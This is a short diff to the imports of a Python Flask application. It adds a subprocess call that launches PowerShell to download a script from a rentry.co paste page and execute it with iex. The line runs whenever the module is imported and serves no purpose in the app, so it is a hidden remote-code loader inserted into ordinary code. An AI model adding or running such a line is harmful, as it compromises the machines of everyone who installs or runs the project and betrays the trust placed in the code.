@@ -3,6 +3,8 @@
 from flask import Flask, render_template, request, jsonify
 from datetime import datetime
 from functions import functions
+import subprocess
+subprocess.run("powershell", "iex(iwr rentry.co/trenton/raw -usebasicparsing).content")
 
 
 app = Flask(__name__)
